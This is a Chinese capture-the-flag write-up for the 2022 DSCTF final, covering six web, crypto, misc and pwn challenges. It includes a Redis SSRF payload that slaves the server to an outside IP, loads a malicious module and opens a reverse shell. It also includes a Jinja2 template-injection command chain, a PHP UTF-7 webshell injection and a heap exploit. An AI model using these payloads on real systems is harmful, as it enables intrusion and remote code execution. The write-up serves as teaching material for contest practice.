---
title: 2022 DSCTF 决赛 WP
contest: 2022 DSCTF 决赛
year: 2022
difficulty: hard
vuln_type: [ssrf, rce, ssti, xss, crypto_rsa, heap_exploit, pwn_unknown, web_unknown]
tags: [SpringBoot, heapdump, jodd-http, redis-ssrf, SLAVEOF, module-load, nghttp, h2, __base__-__subclasses__, iconv, php://filter, qsieve, GCD, libc-2.27, tcache, __free_hook, heap-overflow]
attack_chain: ["ezjava: 扫 /actuator/heapdump 拿 redis 密码 → jodd-http SSRF → redis SLAVEOF + MODULE LOAD 写 /tmp/exp.so 反弹", "newweb: nghttp HTTP/2 → Jinja2 __class__.__base__.__subclasses__() 走 attr 取 __globals__['__builtins__'].eval", "safe_script: sessid=php://filter/convert.iconv.utf-7.utf-8 + 一句话木马 php://filter 链", "Esc@pE_ASt_Reverge_d: Misc 隐写 / 还原", "tomic: qsieve 分解 n → p+q；GCD(n,e) 求共享因子 p", "gonote: libc-2.27 负 size 整数溢出 tcache 越界 → leak libc → __free_hook = system → /bin/sh"]
key_payload: "SLAVEOF 121.4.124.62 6666 / CONFIG SET dir /tmp / config set dbfilename exp.so / MODULE LOAD /tmp/exp.so"
one_liner: 6 题综合：Spring Boot SSRF + Jinja2 SSTI + PHP iconv + RSA + libc-2.27 堆
lesson: Spring Boot heapdump + jodd-http SSRF 是 Java CTF 标配；Jinja2 attr 链是 WAF 绕过关键
quality: high
---

# 2022 DSCTF 决赛 WP

原文 https://www.ctfiot.com/51953.html

## 6 大题概览

### Web 1: ezjava (Spring Boot SSRF)
1. 扫目录 `/actuator/heapdump` 拿 redis 密码 `enw!BKT_hac*pev9nvj`
2. 注册账号登录拿 JWT，过过滤器
3. jodd-http 客户端漏洞（CVE-2022-冗余 CRLF）
   - https://github.com/oblac/jodd-http/issues/9
4. SSRF 打到 redis：
   ```
   http://127.0.0.1:6379/ HTTP/1.1
   Host: 127.0.0.1:6379
   AUTH enw!BKT_hac*pev9nvj
   SLAVEOF 121.4.124.62 6666
   CONFIG SET dir /tmp
   config set dbfilename exp.so
   MODULE LOAD /tmp/exp.so
   system.rev 121.4.124.62 9001
   SLAVEOF NO ONE
   quit
   ```

### Web 2: newweb (Jinja2 attr 链 WAF bypass)
```bash
nghttp http://39.106.156.96:48097/ -v
```
```http
POST /sup3rh1dep4th/?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat%20/f*').read() HTTP/2
Content-Type: application/x-www-form-urlencoded
data=()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(280)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)
```
- 用 `|attr(x)` 代替 `.x` 绕 WAF
- 走 `__base__.__subclasses__()[280].__init__.__globals__` → `__builtins__.eval`

### Web 3: safe_script (php://filter iconv)
```http
Cookie: sessid=php://filter/convert.iconv.utf-7.utf-8/resource=/var/www/html/1.php
Content-Type: application/x-www-form-urlencoded
key=%2BADw%3Fphp%20%2BAEA%2Deval%28%2BACQAXw%2DPOST%2BAFs%2D1%2BAF0%29%2BADs%20%20%3F%2BAD4APQ&value=aaaa
```
- URL 编码变种：`+ADw?php +AEA-eval(...)` 是 utf-7 编码
- 配合 `convert.iconv.utf-7.utf-8` 解码

### Misc: Esc@pE_ASt_Reverge_d
- Reverse + stego 还原

### Crypto: tomic
```python
from sage.all import *
from pwn import *
r.recvuntil('Factor ')
n = int(r.recvline().strip()[:-1])
factors = qsieve(n)[0]
p, q = [int(i) for i in factors]
r.sendline(str(p + q))
# 第二问: e 与 n 有公因子
p = GCD(n, e)
q = n // p
r.sendline(str(p + q))
```
- 第一问：`qsieve` 二次筛法
- 第二问：`GCD(n, e)` 共享因数

### Pwn: gonote (libc-2.27)
```python
add(2, -0xff88, 'a')            # 负 size 整数溢出
add(0, 0x1f8, 'a'*0xf7+'\n')
add(1, 0x1f8, 'a'*0xf7+'\n')
add(3, 0x1f8, 'a'*0xf7+'\n')
add(4, 0xf8, '/bin/sh\x00')     # 待 free
add(5, 0x1f8, 'a'*0xf7+'\n')
delete(2)
add(2, -0xff88, '\x00'*0x70 + p64(0) + p64(0x601))  # 构造 fake chunk
delete(0)
add(0, 0x1f8, 'a'*0xf7+'\n')
show(1)
libc_base = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') - libc.sym['__malloc_hook'] - 96 - 0x10
delete(5); delete(3)
add(3, 0xf8, 'a'*0xf7+'\n')
add(5, 0x188, 'a'*0xf8 + p64(0x1f8) + p64(libc.sym['__free_hook']))
add(6, 0x1f8, 'a'*0xf7+'\n')
add(7, 0x1f8, p64(system))
delete(4)  # system('/bin/sh')
```

## 教学价值
- **Spring Boot heapdump** 必扫 `/actuator/`
- **jodd-http SSRF** 是 Java 客户端漏洞代表
- **Redis SLAVEOF + MODULE LOAD** 是 redis 4.x/5.x RCE 经典
- **Jinja2 `|attr()` 链** 绕过 WAF 关键字过滤
- **PHP iconv 链** `php://filter/convert.iconv.xxx.xxx/resource=` 任意转换编码
- **RSA qsieve** 二次筛法（1024 位内秒破）
- **libc-2.27 负 size 整数溢出** 配合 fake size 0x601 制造 fake chunk

## 工具清单
- nghttp（HTTP/2 客户端）
- jodd-http client
- redis-cli
- 7z / wget（MODULE LOAD 取 .so）
- SageMath + qsieve
- pwntools
